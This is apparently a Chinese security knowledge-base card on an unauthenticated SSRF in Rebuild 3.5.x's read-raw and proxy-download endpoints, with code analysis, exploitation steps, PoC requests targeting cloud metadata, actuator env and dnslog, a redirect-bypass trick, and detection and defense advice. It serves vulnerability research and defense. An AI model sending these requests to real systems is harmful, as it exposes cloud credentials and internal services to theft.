---
id: web-generic-ssrf-rebuild-filedownloader-readraw-proxydownload
title: Rebuild FileDownloader read-raw/proxy-download 未授权 SSRF：url 参数经 OkHttp 代发并回显响应
type: scenario
domain: web
path: web/generic/ssrf
technique: unauth-url-fetch-okhttp
tags:
- web
- java
- rebuild
- ssrf
- unauthorized
- okhttp
- file-downloader
cve: []
severity: high
confidence: high
affected_versions: 3.5 大版本（原文标注：SSRF 仅 3.5 大版本存在，实测 3.5.4）
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V600
  verified_at: '2026-11-12T17:24:39+08:00'
  notes: 已对照原文与全部13张截图核对：图05 read-raw外部URL分支在RbAssert.isAllow(checkUser)之前OkHttpUtils.get并回显后直接return(未授权SSRF成立)、图06 OkHttpUtils.get原样url构造并execute、图07 proxy-download仅urlDecode->getStorageFile->writeLocalFile无checkUser、图08 getStorageFile的http(s)分支走OkHttpUtils.readBinary，均与卡片一致；原文明确'ssrf和读数据库的只能在3.5这个大版本里面才有'，已set-versions=3.5大版本(实测3.5.4)；与同产品文件读取卡sink不同非同链；注意/filex/前缀与类级路由取自同产品已验证卡，原文仅给方法级映射(卡片已注明)；未验证点：原文无实际SSRF请求截图，未复现
url: /docs/web/generic/ssrf/web-generic-ssrf-rebuild-filedownloader-readraw-proxydownload/
draft: false
kb_aliases:
- Rebuild SSRF
- FileDownloader SSRF
- rebuild read-raw SSRF
- rebuild proxy-download SSRF
- rebuild url 参数 SSRF
---

## 一句话结论

Rebuild 3.5.x 的 `FileDownloader` 暴露 `read-raw` 与 `proxy-download` 两个 GET 接口，`url` 参数未经协议/主机校验就交给 OkHttp 发起请求并把响应回显；其中 `read-raw` 的外部 URL 分支在 `checkUser` 登录校验之前执行，未登录即可借服务器身份访问内网服务与云元数据。

## 原理

- `FileDownloader#readRawText`（`@GetMapping("read-raw")`）先 `getParameterNotNull(request, "url")` 取参，再判断 `CommonsUtils.isExternalUrl(filePath)`；命中外部 URL 时直接 `OkHttpUtils.get(filePath, null, charset)` 并把返回文本 `ServletUtils.write(response, text)` 回显，然后才执行 `RbAssert.isAllow(checkUser(request), "Unauthorized access")`。鉴权逻辑排在 SSRF 之后，攻击者无需任何凭据即可触发出站请求。
- `OkHttpUtils#get` 用 `new Request.Builder().url(url)` 原样构造请求并 `client.newCall(request).execute()`，没有协议白名单、内网 IP 黑名单或重定向目标校验；OkHttp 默认跟随 302 跳转，响应体经 `response.body().bytes()` 转成字符串返回。因此攻击者既能打到任意 http/https 地址，又能读到完整响应。
- `FileDownloader#proxyDownload`（`@GetMapping("proxy-download")`）接收 `url` 后仅做 `CodecUtils.urlDecode`，随后调用 `QiniuCloud.getStorageFile(fileUrl)`；`getStorageFile` 在路径以 `http://`/`https://` 开头时调用 `OkHttpUtils.readBinary(filePath, file, null)` 把远端内容下载到临时文件，再由 `writeLocalFile(tmp, response)` 输出给请求方。方法体内没有 `checkUser` 调用，结合该产品文件接口位于拦截器放行的 `/filex/` 前缀，同样构成未授权 SSRF。
- 与盲 SSRF 不同，两处都把握取到的远端内容写回 HTTP 响应，属于完整读原语：可直接读取云元数据、内网管理面板、未授权内部 API 的响应体。
- 局限：OkHttp 只支持 http/https，无法直接使用 gopher/file 等协议；`proxy-download` 先落盘临时文件再输出，超大响应会受临时文件写入与超时影响。

## 触发条件

- 目标是 Rebuild 3.5 大版本（原文标注 SSRF 仅该大版本存在，实测 3.5.4），服务已完成安装并可访问。
- `FileDownloader` 的 `read-raw`/`proxy-download` 路由对外可达；`/filex/` 前缀在鉴权拦截器白名单内。
- 服务器能出网或能访问目标内网；`read-raw` 传外部 http(s) URL 时无需登录。

## 利用步骤

1. 识别 Rebuild：`/user/login` 登录页、`REBUILD` 品牌与静态资源特征。
2. 用 `read-raw` 验证回显：请求 `url=http://<dnslog 域名>/`，观察 DNS/HTTP 出站记录与响应体。
3. 读云元数据或内网服务：把 `url` 换成 `http://169.254.169.254/latest/meta-data/`、`http://127.0.0.1:8080/actuator/env` 等地址。
4. 用 `proxy-download` 交叉验证：传 URL 编码后的内网地址，响应体即远端内容。
5. 若只允许已登记的外部域名，可自建 302 跳转服务，把跳转目标指向内网（OkHttp 默认跟随重定向）。
6. 利用读到的内网接口、配置或云临时凭据继续横向。

## PoC

```http
GET /filex/download/read-raw?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1
Host: target
```

```http
GET /filex/download/proxy-download?url=http%3A%2F%2F127.0.0.1%3A8080%2Factuator%2Fenv HTTP/1.1
Host: target
```

```bash
curl -s 'http://target/filex/download/read-raw?url=http://<random>.dnslog.cn/'
curl -s 'http://target/filex/download/proxy-download?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F'
```

- 路由前缀 `/filex/download/` 取自同产品已验证的文件接口；文中只展示方法级映射 `read-raw`/`proxy-download`，实际以目标类级 `@RequestMapping` 为准。
- `read-raw` 可选参数 `charset`（默认 UTF-8）与 `cut`（MB 级截断）；`proxy-download` 需要对 url 做 URL 编码。

## 变体与关联

- 本地路径分支：`getStorageFile` 在非 http(s)、非七牛云时走 `RebuildConfiguration.getFileOfData(filePath)`，可读取数据目录（默认 `~/.rebuild`）内文件；与默认 AES 密钥组合可解出数据库口令，见 [[web-java-component-rebuild-unauth-file-read-install-config-aes-default-key]]。
- 同接口的 `charset` 可影响回显解码，`cut` 用于限制返回大小，可借错误信息判断文件是否存在。
- 关联：[[web-generic-ssrf-oa-getrawfile-weak-blacklist]]（同类 Java 文件接口 url 参数 SSRF）、[[web-generic-ssrf-url-parser-differential-allowlist-bypass]]（白名单解析差异）、[[cloud/metadata]]（云元数据读取）。
- 证据边界：文中为代码审计与思路说明，未附实际 SSRF 请求截图；代码路径完整、鉴权顺序明确，置信度 high。

## 检测与防御

- 检测：审计 `read-raw`/`proxy-download` 请求，`url` 含内网地址、云元数据地址、dnslog 域名；服务器对非业务域名发起出站 HTTP；响应体异常出现内网页面或元数据。
- 防御：对 `url` 做协议 + 域名白名单，解析后校验 IP 不属于内网/回环/链路本地；禁止跟随重定向或逐跳校验目标；文件代理接口只允许受控源，读取本地文件时使用规范化路径 + 允许目录白名单；升级修复版本。
- 网络层：限制应用出站访问；云主机启用 IMDSv2 并限制元数据服务访问来源。
